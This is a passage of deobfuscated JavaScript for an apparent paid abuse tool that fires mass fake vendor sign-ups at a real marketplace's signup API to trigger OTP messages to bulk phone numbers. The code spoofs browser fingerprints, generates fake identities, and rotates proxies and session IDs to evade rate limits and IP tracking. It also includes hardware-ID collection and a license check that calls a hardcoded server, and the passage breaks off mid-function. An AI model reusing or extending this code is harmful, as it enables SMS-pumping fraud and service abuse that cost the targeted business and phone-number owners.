v18.v = 0x8f, v18.buildMin = 0x1ce3, v18.buildMax = 0x1cf6, v18.grease = "\"Not A(Brand\";v=\"99\"";
const v19 = {};
v19.v = 0x90, v19.buildMin = 0x1cf7, v19.buildMax = 0x1cfd, v19.grease = "\"Not(A;Brand\";v=\"8\"";
const v20 = {};
v20.v = 0x91, v20.buildMin = 0x1cfe, v20.buildMax = 0x1d03, v20.grease = "\"Not;A)Brand\";v=\"24\"";
const v21 = {};
v21.v = 0x92, v21.buildMin = 0x1d04, v21.buildMax = 0x1d1b, v21.grease = "\"Not)A=Brand\";v=\"99\"";
const v22 = {};
v22.v = 0x93, v22.buildMin = 0x1d1c, v22.buildMax = 0x1d35, v22.grease = "\"Not=A_Brand\";v=\"8\"";
const v23 = {};
v23.v = 0x94, v23.buildMin = 0x1d36, v23.buildMax = 0x1d49, v23.grease = "\"Not/A)Brand\";v=\"24\"";
const v24 = {};
v24.v = 0x95, v24.buildMin = 0x1d4a, v24.buildMax = 0x1d7d, v24.grease = "\"Not)A;Brand\";v=\"24\"";
const CHROME_VERSIONS = [v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14, v15, v16, v17, v18, v19, v20, v21, v22, v23, v24];
function getRandomClient() {
  const v63 = CHROME_VERSIONS,
    v64 = Math.random() < 0.6,
    v65 = v64 ? v63.slice(10) : v63,
    v66 = v65[Math.floor(Math.random() * v65.length)],
    v67 = Math.floor(Math.random() * (v66.buildMax - v66.buildMin + 1)) + v66.buildMin,
    v68 = Math.floor(Math.random() * 200) + 1,
    v69 = Math.random() < 0.35,
    v70 = !v69 && Math.random() < 0.5;
  let v71, v72, v73;
  if (v69) v71 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v66.v + ".0." + v67 + '.' + v68 + " Safari/537.36", v72 = "\"macOS\"", v73 = "\"10.15.7\"";else {
    if (v70) v71 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v66.v + ".0." + v67 + '.' + v68 + " Safari/537.36", v72 = "\"Windows\"", v73 = "\"15.0.0\"";else {
      v71 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v66.v + ".0." + v67 + '.' + v68 + " Safari/537.36", v72 = "\"Windows\"", v73 = "\"10.0.0\"";
    }
  }
  const v74 = {};
  v74.userAgent = v71, v74.secChUa = "\"Google Chrome\";v=\"" + v66.v + "\", \"Chromium\";v=\"" + v66.v + "\", " + v66.grease, v74.secChUaPlatform = v72, v74.secChUaPlatformVersion = v73, v74.chromeVersion = v66.v;
  return v74;
}
function parseProxy(v75) {
  if (!v75) return null;
  if (typeof v75 === "object") return v75;
  v75 = v75.trim();
  if (!v75) return null;
  let v76, v77, v78, v79;
  if (v75.includes("://")) v75 = v75.split("://")[1];
  if (v75.includes('@')) {
    const v81 = v75.split('@'),
      v82 = v81[0].split(':'),
      v83 = v81[1].split(':');
    v78 = v82[0], v79 = v82[1], v76 = v83[0], v77 = parseInt(v83[1]);
  } else {
    const v84 = v75.split(':');
    if (v84.length === 2) {
      v76 = v84[0], v77 = parseInt(v84[1]);
    } else {
      if (v84.length === 4) {
        !isNaN(parseInt(v84[3])) && isNaN(parseInt(v84[1])) ? (v78 = v84[0], v79 = v84[1], v76 = v84[2], v77 = parseInt(v84[3])) : (v76 = v84[0], v77 = parseInt(v84[1]), v78 = v84[2], v79 = v84[3]);
      } else v84.length === 3 && (v76 = v84[0], v77 = parseInt(v84[1]), v78 = v84[2]);
    }
  }
  if (!v76 || !v77) return null;
  const v80 = {};
  v80.type = "http", v80.host = v76, v80.port = v77, v80.user = v78;
  v80.pass = v79;
  v80.original = v75;
  return v80;
}
function rotateSessionId(v85) {
  if (!v85 || !v85.user) return v85;
  const v86 = {
    ...v85
  };
  const v87 = v86;
  if (v87.user.includes("-ssid-")) {
    {
      const v88 = crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, '').substring(0, 10);
      v87.user = v87.user.replace(/-ssid-[A-Za-z0-9_]+/, "-ssid-" + v88);
    }
  } else {
    if (v87.user.includes("-session-")) {
      const v89 = crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, '').substring(0, 10);
      v87.user = v87.user.replace(/-session-[A-Za-z0-9_]+/, "-session-" + v89);
    } else {
      if (/_sid_/i.test(v87.user)) {
        {
          const v90 = crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, '').substring(0, 10);
          v87.user = v87.user.replace(/_sid_[A-Za-z0-9]+/i, "_sid_" + v90);
        }
      }
    }
  }
  return v87;
}
function createProxyAgent(v91) {
  if (!v91) return null;
  const v92 = typeof v91 === "string" ? parseProxy(v91) : v91;
  if (!v92) return null;
  let v93 = '';
  if (v92.type === "socks5" || v92.type === "socks4") {
    return v93 = "socks5://" + (v92.user ? encodeURIComponent(v92.user) + ':' + encodeURIComponent(v92.pass || '') + '@' : '') + v92.host + ':' + v92.port, new SocksProxyAgent(v93);
  } else return v93 = "http://" + (v92.user ? encodeURIComponent(v92.user) + ':' + encodeURIComponent(v92.pass || '') + '@' : '') + v92.host + ':' + v92.port, new HttpsProxyAgent(v93);
}
function sendRequest(v94, v95, v96, v97, v98 = null, v99 = 20000) {
  return new Promise((v100, v101) => {
    {
      const v102 = new URL(v94),
        v103 = {
          ...v96
        };
      let v104 = v103;
      !v104["Accept-Encoding"] && (v104["Accept-Encoding"] = "gzip, deflate, br");
      if (v97) {
        v104["Content-Length"] = Buffer.byteLength(v97);
      }
      const v105 = {
        'hostname': v102.hostname,
        'path': v102.pathname + v102.search,
        'method': v95,
        'headers': v104,
        'timeout': v99
      };
      if (v98) {
        {
          const v107 = typeof v98 === "object" ? v98 : parseProxy(v98);
          if (!v107 || isNaN(v107.port) || v107.port <= 0) return v101(new Error("FATAL: Invalid proxy. Aborting to prevent IP leak."));
          v105.agent = createProxyAgent(v107);
        }
      }
      const v106 = https.request(v105, v108 => {
        {
          const v109 = [];
          v108.on("data", v110 => v109.push(v110)), v108.on("error", v101), v108.on("end", () => {
            {
              let v111 = Buffer.concat(v109);
              const v112 = v108.headers["content-encoding"];
              if (v112 === "gzip") {
                try {
                  v111 = zlib.gunzipSync(v111);
                } catch (v113) {}
              } else {
                if (v112 === "deflate") try {
                  v111 = zlib.inflateSync(v111);
                } catch (v114) {} else {
                  if (v112 === 'br') {
                    try {
                      v111 = zlib.brotliDecompressSync(v111);
                    } catch (v115) {}
                  }
                }
              }
              v100({
                'status': v108.statusCode,
                'data': v111.toString("utf8"),
                'headers': v108.headers
              });
            }
          });
        }
      });
      v106.on("error", v101), v106.on("timeout", () => {
        v106.destroy();
        v101(new Error("timeout"));
      });
      if (v97) v106.write(v97);
      v106.end();
    }
  });
}
function generateRandomName() {
  const v116 = ["John", "Jane", "Michael", "Emily", "David", "Sarah", "Chris", "Laura", "Daniel", "Emma", "Ahsan", "Habib"],
    v117 = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"];
  return v116[Math.floor(Math.random() * v116.length)] + '\x20' + v117[Math.floor(Math.random() * v117.length)];
}
function generateRandomEmail(v118) {
  const v119 = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "mfxis.com"],
    v120 = Math.floor(Math.random() * 10000);
  return '' + v118.replace(/\s+/g, '').toLowerCase() + v120 + '@' + v119[Math.floor(Math.random() * v119.length)];
}
function generateRandomPassword() {
  return Math.random().toString(36).slice(-8) + Math.random().toString(36).slice(-8);
}
const v25 = {};
v25['1'] = "America/New_York", v25['7'] = "Europe/Moscow", v25['20'] = "Africa/Cairo", v25['27'] = "Africa/Johannesburg", v25['30'] = "Europe/Athens", v25['31'] = "Europe/Amsterdam", v25['32'] = "Europe/Brussels", v25['33'] = "Europe/Paris", v25['34'] = "Europe/Madrid", v25['36'] = "Europe/Budapest", v25['39'] = "Europe/Rome", v25['40'] = "Europe/Bucharest", v25['41'] = "Europe/Zurich", v25['43'] = "Europe/Vienna", v25['44'] = "Europe/London", v25['45'] = "Europe/Copenhagen", v25['46'] = "Europe/Stockholm", v25['47'] = "Europe/Oslo", v25['48'] = "Europe/Warsaw", v25['49'] = "Europe/Berlin", v25['51'] = "America/Lima", v25['52'] = "America/Mexico_City", v25['53'] = "America/Havana", v25['54'] = "America/Argentina/Buenos_Aires", v25['55'] = "America/Sao_Paulo", v25['56'] = "America/Santiago", v25['57'] = "America/Bogota", v25['58'] = "America/Caracas", v25['60'] = "Asia/Kuala_Lumpur", v25['61'] = "Australia/Sydney", v25['62'] = "Asia/Jakarta", v25['63'] = "Asia/Manila";
v25['64'] = "Pacific/Auckland", v25['65'] = "Asia/Singapore", v25['66'] = "Asia/Bangkok", v25['81'] = "Asia/Tokyo", v25['82'] = "Asia/Seoul", v25['84'] = "Asia/Ho_Chi_Minh", v25['86'] = "Asia/Shanghai", v25['90'] = "Europe/Istanbul", v25['91'] = "Asia/Kolkata", v25['92'] = "Asia/Karachi", v25['93'] = "Asia/Kabul", v25['94'] = "Asia/Colombo", v25['95'] = "Asia/Yangon", v25['98'] = "Asia/Tehran", v25["212"] = "Africa/Casablanca", v25["213"] = "Africa/Algiers", v25["216"] = "Africa/Tunis", v25["218"] = "Africa/Tripoli", v25["220"] = "Africa/Banjul", v25["221"] = "Africa/Dakar", v25["222"] = "Africa/Nouakchott", v25["223"] = "Africa/Bamako", v25["224"] = "Africa/Conakry", v25["225"] = "Africa/Abidjan", v25["226"] = "Africa/Ouagadougou", v25["227"] = "Africa/Niamey", v25["228"] = "Africa/Lome", v25["229"] = "Africa/Porto-Novo", v25["230"] = "Indian/Mauritius", v25["231"] = "Africa/Monrovia", v25["232"] = "Africa/Freetown", v25["233"] = "Africa/Accra", v25["234"] = "Africa/Lagos", v25["235"] = "Africa/Ndjamena", v25["236"] = "Africa/Bangui", v25["237"] = "Africa/Douala", v25["238"] = "Atlantic/Cape_Verde", v25["239"] = "Africa/Sao_Tome", v25["240"] = "Africa/Malabo", v25["241"] = "Africa/Libreville", v25["242"] = "Africa/Brazzaville", v25["243"] = "Africa/Kinshasa", v25["244"] = "Africa/Luanda", v25["245"] = "Africa/Bissau", v25["246"] = "Indian/Chagos", v25["247"] = "Atlantic/St_Helena", v25["248"] = "Indian/Mahe", v25["249"] = "Africa/Khartoum", v25["250"] = "Africa/Kigali", v25["251"] = "Africa/Addis_Ababa", v25["252"] = "Africa/Mogadishu", v25["253"] = "Africa/Djibouti", v25["254"] = "Africa/Nairobi", v25["255"] = "Africa/Dar_es_Salaam", v25["256"] = "Africa/Kampala", v25["257"] = "Africa/Bujumbura", v25["258"] = "Africa/Maputo", v25["260"] = "Africa/Lusaka", v25["261"] = "Indian/Antananarivo", v25["262"] = "Indian/Reunion", v25["263"] = "Africa/Harare", v25["264"] = "Africa/Windhoek", v25["265"] = "Africa/Blantyre", v25["266"] = "Africa/Maseru", v25["267"] = "Africa/Gaborone", v25["268"] = "Africa/Mbabane", v25["269"] = "Indian/Comoro", v25["350"] = "Europe/Gibraltar", v25["351"] = "Europe/Lisbon", v25["352"] = "Europe/Luxembourg", v25["353"] = "Europe/Dublin", v25["354"] = "Atlantic/Reykjavik", v25["355"] = "Europe/Tirane", v25["356"] = "Europe/Malta", v25["357"] = "Asia/Nicosia", v25["358"] = "Europe/Helsinki", v25["359"] = "Europe/Sofia", v25["370"] = "Europe/Vilnius", v25["371"] = "Europe/Riga", v25["372"] = "Europe/Tallinn", v25["373"] = "Europe/Chisinau", v25["374"] = "Asia/Yerevan", v25["375"] = "Europe/Minsk", v25["376"] = "Europe/Andorra", v25["377"] = "Europe/Monaco", v25["378"] = "Europe/San_Marino", v25["380"] = "Europe/Kiev", v25["381"] = "Europe/Belgrade", v25["382"] = "Europe/Podgorica", v25["385"] = "Europe/Zagreb", v25["386"] = "Europe/Ljubljana", v25["387"] = "Europe/Sarajevo", v25["389"] = "Europe/Skopje", v25["420"] = "Europe/Prague", v25["421"] = "Europe/Bratislava", v25["423"] = "Europe/Vaduz", v25["500"] = "Atlantic/Stanley", v25["501"] = "America/Belize", v25["502"] = "America/Guatemala", v25["503"] = "America/El_Salvador", v25["504"] = "America/Tegucigalpa", v25["505"] = "America/Managua", v25["506"] = "America/Costa_Rica", v25["507"] = "America/Panama", v25["508"] = "America/Miquelon", v25["509"] = "America/Port-au-Prince", v25["590"] = "America/Guadeloupe", v25["591"] = "America/La_Paz", v25["592"] = "America/Guyana", v25["593"] = "America/Guayaquil", v25["594"] = "America/Cayenne", v25["595"] = "America/Asuncion", v25["596"] = "America/Martinique", v25["597"] = "America/Paramaribo", v25["598"] = "America/Montevideo", v25["599"] = "America/Curacao", v25["850"] = "Asia/Pyongyang", v25["852"] = "Asia/Hong_Kong", v25["853"] = "Asia/Macau", v25["855"] = "Asia/Phnom_Penh", v25["856"] = "Asia/Vientiane", v25["880"] = "Asia/Dhaka", v25["886"] = "Asia/Taipei", v25["960"] = "Indian/Maldives", v25["961"] = "Asia/Beirut", v25["962"] = "Asia/Amman", v25["963"] = "Asia/Damascus", v25["964"] = "Asia/Baghdad", v25["965"] = "Asia/Kuwait", v25["966"] = "Asia/Riyadh", v25["967"] = "Asia/Aden", v25["968"] = "Asia/Muscat", v25["970"] = "Asia/Gaza", v25["971"] = "Asia/Dubai", v25["972"] = "Asia/Jerusalem", v25["973"] = "Asia/Bahrain", v25["974"] = "Asia/Qatar", v25["975"] = "Asia/Thimphu", v25["976"] = "Asia/Ulaanbaatar", v25["977"] = "Asia/Kathmandu", v25["992"] = "Asia/Dushanbe", v25["993"] = "Asia/Ashgabat", v25["994"] = "Asia/Baku", v25["995"] = "Asia/Tbilisi", v25["996"] = "Asia/Bishkek", v25["998"] = "Asia/Tashkent";
const TIMEZONE_MAP = v25;
function getTzForPhone(v121) {
  let v122 = "Asia/Dhaka";
  const v123 = Object.keys(TIMEZONE_MAP).sort((v124, v125) => v125.length - v124.length);
  for (const v126 of v123) {
    if (v121.startsWith('+' + v126)) return TIMEZONE_MAP[v126];
  }
  return v122;
}
async function triggerOTP(v127, v128 = {}) {
  const {
      onStatus = () => {},
      proxy = null,
      timeout = 20000,
      flowType = "SIGN_UP"
    } = v128,
    v129 = normalizePhoneNumber(v127),
    v130 = getTzForPhone(v129),
    v131 = getRandomClient(),
    v132 = generateRandomName(),
    v133 = generateRandomEmail(v132),
    v134 = generateRandomPassword(),
    v135 = {};
  v135.accept = "application/json, text/plain, */*", v135["accept-encoding"] = "gzip, deflate, br, zstd", v135["accept-language"] = "en-US,en;q=0.9", v135.base_version = "1.0.0", v135["content-type"] = "application/json", v135.device_type = "WEB", v135.timezone = v130;
  v135.origin = "https://www.allmartplace.com", v135.priority = "u=1, i", v135.referer = "https://www.allmartplace.com/en/";
  v135["sec-ch-ua"] = v131.secChUa, v135["sec-ch-ua-mobile"] = '?0', v135["sec-ch-ua-platform"] = v131.secChUaPlatform, v135["sec-fetch-dest"] = "empty", v135["sec-fetch-mode"] = "cors", v135["sec-fetch-site"] = "same-origin", v135["user-agent"] = v131.userAgent;
  const v136 = v135;
  try {
    onStatus("[1/1] Signing up vendor for " + v129 + "...");
    const v137 = JSON.stringify({
        'email': v133,
        'password': v134,
        'first_name': v132,
        'phone_no': v129,
        'marketplace_reference_id': "efe8e3bdceee848c76c0b06fe6a2e22c",
        'device_token': null,
        'fp': Math.floor(Math.random() * 10000000000),
        'app_type': "WEB",
        'lat': "17.1260468",
        'lng': "-61.8216054",
        'address': "AllMart - Local Marketplace, Cassada Gardens, Antigua and Barbuda",
        'domain_name': "www.allmartplace.com",
        'dual_user_key': 0x0,
        'language': 'en'
      }),
      v138 = await sendRequest("https://www.allmartplace.com/api/marketplace_vendor_signup", "POST", v136, v137, proxy, timeout);
    debugLog(v129, "signup-res", v138.data);
    const v139 = v138.data ? (() => {
      try {
        return JSON.parse(v138.data);
      } catch {
        return {};
      }
    })() : {};
    if (v138.status === 200 && (v139.status === 200 || v139.status === true || v139.success === true)) {
      onStatus("[1/1] ✅ Signup Success");
      const v140 = {};
      return v140.success = true, v140.message = "Signup Triggered (" + v133 + ')', v140.phone = v129, v140.flow = flowType, v140;
    } else {
      if (v138.status === 429) {
        throw new Error("Rate Limited (429) — Too many requests from this IP");
      } else {
        {
          const v141 = v139.message || v139.error || "Failed (HTTP " + v138.status + ')';
          throw new Error('' + v141);
        }
      }
    }
  } catch (v142) {
    const v143 = {};
    return v143.success = false, v143.message = '' + v142.message, v143.phone = v129, v143;
  }
}
if (isMainThread) {
  class Dashboard {
    constructor(v144) {
      {
        this.totalNumbers = v144;
        this.processed = 0;
        this.successful = 0;
        this.failed = 0;
        this.startTime = Date.now();
      }
    }
    ["addLog"](v145, v146) {
      let v147 = '';
      if (v146 === "success") {
        v147 = chalk.hex("#00C9A7").bold(" ✦ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#00C9A7")("Signup Sent") + chalk.hex("#555555")(" → ") + chalk.hex("#FFD700").bold(v145.replace("Signup Triggered (", '').replace(')', ''));
      } else {
        if (v146 === "retry") v147 = chalk.hex("#FFD700").bold(" ↻ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#FFD700")(v145);else {
          const v148 = v145.match(/\+?\d{7,}/),
            v149 = v148 ? v148[0] : '',
            v150 = v145.replace(/Failed on \S+: /, '').replace(/Fatal error on \S+: /, '');
          v147 = chalk.hex("#FF4466").bold(" ✗ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#FF4466")(v149 ? '' + v149 : '') + chalk.hex("#555555")(v149 ? " → " : '') + chalk.hex("#888888")(v150);
        }
      }
      process.stdout.write("\r[K" + v147 + '\x0a'), this.render();
    }
    ["setStatus"](v151) {}
    ["update"]() {}
    ["render"]() {
      const v152 = this.processed / Math.max(this.totalNumbers, 1),
        v153 = (v152 * 100).toFixed(1),
        v154 = 20,
        v155 = Math.round(v152 * v154),
        v156 = v154 - v155;
      const v157 = chalk.hex("#00C9A7")('█'.repeat(v155)) + chalk.hex("#333333")('░'.repeat(v156)),
        v158 = '\x20\x20' + chalk.hex("#00C9A7").bold("NOT REXY") + chalk.hex("#555555")(" ⮞ ") + v157 + chalk.hex("#888888")('\x20' + v153 + '%') + chalk.hex("#555555")("  │  ") + chalk.hex("#00C9A7").bold('✓\x20' + this.successful) + chalk.hex("#555555")('\x20\x20') + chalk.hex("#FF4466").bold('✗\x20' + this.failed) + chalk.hex("#555555")("  [" + this.processed + '/' + this.totalNumbers + ']');
      process.stdout.write("\r[K" + v158);
    }
    ["stop"]() {
      process.stdout.write("[2K\r\n");
      const v159 = Math.floor((Date.now() - this.startTime) / 1000),
        v160 = Math.floor(v159 / 60);
      const v161 = v159 % 60,
        v162 = v160 + 'm\x20' + v161 + 's';
      console.log(C("  ╔════════════════════════════════════════════╗"));
      console.log(C("  ║") + W.bold("  ALLMART SIGNUP TRIGGER — COMPLETE         ") + C('║')), console.log(C("  ╠════════════════════════════════════════════╣")), console.log(C("  ║") + ('\x20\x20' + chalk.greenBright("Successful") + "   " + chalk.greenBright(String(this.successful).padStart(6)) + "                       ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.red("Failed") + "       " + chalk.red(String(this.failed).padStart(6)) + "                       ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.cyan("Total Time") + "   " + chalk.cyan(v162.padEnd(6)) + "                       ") + C('║')), console.log(C("  ╚════════════════════════════════════════════╝\n"));
    }
  }
  async function selectOption(v163, v164) {
    return new Promise(v165 => {
      {
        let v166 = 0;
        process.stdin.resume(), readline.emitKeypressEvents(process.stdin);
        if (process.stdin.isTTY) process.stdin.setRawMode(true);
        const fn4 = () => {
          process.stdout.write("[2J[H");
          printHeader(), console.log("   [33m" + v163 + "[0m\n"), v164.forEach((v167, v168) => {
            {
              if (v168 === v166) {
                console.log("   [36m➔[35m " + v167.name + "[0m");
              } else console.log("     [90m" + v167.name + "[0m");
            }
          });
        };
        fn4();
        const fn5 = (v169, v170) => {
          if (v170.ctrl && v170.name === 'c') process.exit(0);
          if (v170.name === 'up') v166 = (v166 - 1 + v164.length) % v164.length, fn4();else {
            if (v170.name === "down") v166 = (v166 + 1) % v164.length, fn4();else v170.name === "return" && (process.stdin.setRawMode(false), process.stdin.removeListener("keypress", fn5), v165(v164[v166].value));
          }
        };
        process.stdin.on("keypress", fn5);
      }
    });
  }
  async function promptText(v171, v172) {
    return new Promise(v173 => {
      process.stdout.write("   [33m" + v171 + "[0m ");
      let v174 = '';
      if (process.stdin.isTTY) process.stdin.setRawMode(false);
      process.stdin.resume();
      const fn6 = v175 => {
        {
          const v176 = v175.toString();
          if (v176.includes('\x0a') || v176.includes('\x0d')) {
            process.stdin.removeListener("data", fn6), v174 += v176.split(/[\r\n]/)[0];
            let v177 = v174.trim();
            if (v177.startsWith('\x22') && v177.endsWith('\x22')) v177 = v177.slice(1, -1);
            v173(v177 || v172);
          } else v174 += v176;
        }
      };
      process.stdin.on("data", fn6);
    });
  }
  async function interactiveWizard() {
    process.stdout.write("[2J[H"), printHeader();
    console.log(W.bold("  --- ALLMART AI  ---\n"));
    const v178 = await selectOption("SELECT NUMBER SOURCE", [{
      'name': "📁 Load from file (numbers.txt)",
      'value': "file"
    }, {
      'name': "🌐 Auto fetch from NexaOTP Panel",
      'value': "nexa"
    }]);
    let v179 = "numbers.txt",
      v180 = null;
    if (v178 === "nexa") {
      {
        let v184 = '';
        const v185 = path.join(__dirname, ".nexa_api_key");
        if (fs.existsSync(v185)) {
          {
            const v192 = fs.readFileSync(v185, "utf8").trim(),
              v193 = await selectOption("Found saved API Key (..." + v192.slice(-4) + "). Use it?", [{
                'name': "Yes, use saved key",
                'value': "yes"
              }, {
                'name': "No, enter new key",
                'value': 'no'
              }, {
                'name': "Delete saved key",
                'value': "delete"
              }]);
            if (v193 === "yes") v184 = v192;else v193 === "delete" && (fs.unlinkSync(v185), console.log(G("\n   ✗ Saved key deleted.\n")));
          }
        }
        if (!v184) {
          v184 = await promptText("Enter NexaOTP API Key:", '');
          const v194 = {};
          v194.name = 'No', v194.value = 'no';
          const v195 = await selectOption("Save this key for future use?", [{
            'name': "Yes, save it",
            'value': "yes"
          }, v194]);
          v195 === "yes" && (fs.writeFileSync(v185, v184, "utf8"), console.log(G("\n   ✓ API key saved.\n")));
        }
        let v186 = [],
          v187 = true;
        while (v187) {
          const v196 = await promptText("Enter range #" + (v186.length + 1) + " (e.g. 21624485XXX):", '');
          if (v196) v186.push(v196);
          const v197 = await selectOption("Add another range?", [{
            'name': "Yes",
            'value': "yes"
          }, {
            'name': "No, proceed",
            'value': 'no'
          }]);
          if (v197 === 'no') v187 = false;
        }
        v186.length === 0 && (console.log(R("\n   ✗ You must provide at least one range.\n")), process.exit(1));
        const v188 = await promptText("How many numbers to process? (e.g. 100):", '50'),
          v189 = parseInt(v188) || 50,
          v190 = await selectOption("SELECT NEXA SERVER", [{
            'name': "Server 1 (/get)",
            'value': "/api/v1/numbers/get"
          }, {
            'name': "Server 2 (/p2/get)",
            'value': "/api/v1/numbers/p2/get"
          }, {
            'name': "Server 3 (/p3/get)",
            'value': "/api/v1/numbers/p3/get"
          }]),
          v191 = {};
        v191.apiKey = v184, v191.ranges = v186, v191.totalCount = v189, v191.serverEndpoint = v190, v180 = v191;
      }
    } else {
      {
        v179 = await promptText("Enter Numbers File Path [default: numbers.txt]:", "numbers.txt");
        if (!fs.existsSync(v179)) fs.writeFileSync(v179, '');
      }
    }
    let v181 = await promptText("Enter Proxies File Path (Leave blank for direct) [default: none]:", "none");
    if (v181 === "none" || v181 === '') v181 = '';
    const v182 = await selectOption("SELECT THREADS", [{
        'name': "10 Threads",
        'value': 0xa
      }, {
        'name': "20 Threads (Default)",
        'value': 0x14
      }, {
        'name': "50 Threads (Fast)",
        'value': 0x32
      }, {
        'name': "100 Threads (Extreme)",
        'value': 0x64
      }]),
      v183 = "SIGN_UP";
    return process.stdin.pause(), {
      'numbersFile': v179,
      'threads': String(v182),
      'proxiesFile': v181,
      'flow': v183,
      'nexaConfig': v180
    };
  }
  function generateHWID() {
    const v198 = require('os'),
      v199 = v198.platform();
    try {
      {
        if (v199 === "win32") {
          {
            const v200 = execSync('powershell -NoProfile -Command "$mg = (Get-ItemProperty \'HKLM:\\SOFTWARE\\Microsoft\\Cryptography\' -ErrorAction SilentlyContinue).MachineGuid; $cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; $disk = (Get-CimInstance Win32_LogicalDisk -Filter \'DeviceID=\\\'C:\\\'\' -ErrorAction SilentlyContinue).VolumeSerialNumber; $mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; Write-Output (($mg,$cpu,$disk,$mb) -join \'|\')"', {
              'stdio': "pipe",
              'timeout': 0x3a98
            }).toString().trim();
            if (!v200) throw new Error("No hardware data");
            const v201 = crypto.createHash("sha256").update(v200).digest("hex").toUpperCase();
            return "SKING-" + v201.substring(0, 8) + '-' + v201.substring(8, 12) + '-' + v201.substring(12, 16);
          }
        } else {
          let v202 = [];
          try {
            const v205 = execSync("settings get secure android_id 2>/dev/null || echo \"\"", {
              'stdio': "pipe",
              'timeout': 0x1388
            }).toString().trim();
            if (v205 && v205 !== "null") v202.push('A:' + v205);
          } catch (v206) {}
          try {
            {
              if (fs.existsSync("/proc/cpuinfo")) {
                const v207 = fs.readFileSync("/proc/cpuinfo", "utf8"),
                  v208 = v207.match(/Serial\s*:\s*(\S+)/i),
                  v209 = v207.match(/Hardware\s*:\s*(.+)/i);
                if (v208 && v208[1] !== "0000000000000000") v202.push('S:' + v208[1].trim());
                if (v209) v202.push('H:' + v209[1].trim());
              }
            }
          } catch (v210) {}
          try {
            if (fs.existsSync("/etc/machine-id")) {
              {
                const v211 = fs.readFileSync("/etc/machine-id", "utf8").trim();
                if (v211) v202.push('M:' + v211);
              }
            }
          } catch (v212) {}
          try {
            {
              const v213 = v198.cpus(),
                v214 = v213 && v213.length > 0 ? v213[0].model : "UnknownCPU",
                v215 = v198.totalmem(),
                v216 = v198.release(),
                v217 = v198.hostname();
              v202.push('F:' + v214 + '|' + v215 + '|' + v216 + '|' + v217);
            }
          } catch (v218) {}
          const v203 = v202.join('||'),
            v204 = crypto.createHash("sha256").update(v203).digest("hex").toUpperCase();
          return "ANKING-" + v204.substring(0, 8) + '-' + v204.substring(8, 12) + '-' + v204.substring(12, 16);
        }
      }
    } catch (v219) {
      return '';
    }
  }
  function verifyServerSignature(v220, v221) {
    if (!v221) return false;
    const v222 = "-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEAIU7Pc75ao+Fn7XGC7kFGeDh7JAs3o4NSL2LgmN0YmfY=\n-----END PUBLIC KEY-----";
    try {
      return crypto.verify(null, Buffer.from(v220, "utf8"), v222, Buffer.from(v221, "base64"));
    } catch (v223) {
      return false;
    }
  }
  async function start() {
    const v224 = generateHWID();
    !v224 && (console.error(R("\n  ✗ Could not generate Hardware ID. Run on Windows.\n")), process.exit(1));
    const v225 = generateHWID();
    v225 !== v224 && (console.error(R("\n  ✗ HWID integrity check failed. Tampering detected.\n")), process.exit(1));
    printHeader(), console.log(W("┌──────────────────────────────────────────────┐"));
    console.log(W("│ [•] Tool      : ") + B("Allmart Vendor Signup        ") + W('│')), console.log(W("│ [•] Your HWID : ") + C(v224.padEnd(29)) + W('│')), console.log(W("│ [•] Status    : ") + Y("Verifying License...         ") + W('│')), console.log(W("└──────────────────────────────────────────────┘")), console.log('');
    let v226 = false,
      v227 = "Licensed";
    const v228 = Date.now();
    try {
      const v247 = "188.137.176.163",
        v248 = require("http"),
        v249 = await new Promise((v250, v251) => {
          {
            const v252 = {};
            v252.hwid = v224, v252.app_id = "allmart", v252.version = "2.0.2", v252.timestamp = v228;
            const v253 = JSON.stringify(v252),
              v254 = {
                'hostname': v247,
                'port': 0xec1,
                'path': "/api/verify",
                'method': "POST",
                'headers': {
                  'Content-Type': "application/json",
                  'Content-Length': Buffer.byteLength(v253)
                },
                'timeout': 0x2710
              },
              v255 = v248.request(v254, v256 => {
                {
                  let v257 = '';
                  v256.on("data", v258 => v257 += v258), v256.on("end", () => {
                    try {
                      v250(JSON.parse(v257));
                    } catch (v259) {
                      v251(v259);
                    }
                  });
                }
              });
            v255.on("error", v251), v255.on("timeout", function () {
              this.destroy(), v251(new Error("Timeout"));
            }), v255.write(v253), v255.end();
          }
        });
      if (v249) {
        {
          v249.status === "update_required" && (console.error(R("\n  ✗ Update required! Please download the latest version.\n")), process.exit(1));
          if (v249.status === "banned" || v249.status === "expired" || !v249.sig) {
            {
              await new Promise(v263 => setTimeout(v263, 2000));
              let v262 = String(v249.reason || "NOT REGISTERED");
              if (!v249.reason && !v249.sig) v262 = "NOT REGISTERED / REMOVED";
              console.error(R("\n  ╔══════════════════════════════════════════════╗")), console.error(R("  ║    ✗ UNAUTHORIZED HARDWARE — ALLMART        ║")), console.error(R("  ╠══════════════════════════════════════════════╣")), console.error(R("  ║  HWID   : ") + Y(v224.padEnd(33)) + R('║')), console.error(R("  ║  Status : " + v262.padEnd(26) + '║')), console.error(R("  ║  Contact: t.me/Rex_OTP_Tool to register     ║")), console.error(R("  ╚══════════════════════════════════════════════╝\n")), process.exit(1);
            }
          }
          const v260 = v224 + "|allmart|2.0.2|" + v228;
          !verifyServerSignature(v260, v249.sig) && (console.error(R("\n  ✗ Internal Server Error (500). Please try again later.\n")), process.exit(1));
          v226 = true;
          let v261 = v249.token;
          if (!v261) {
            console.error(R("\n  ✗ Invalid Server Response: Missing Active Session Token. Aborting.\n")), process.exit(1);
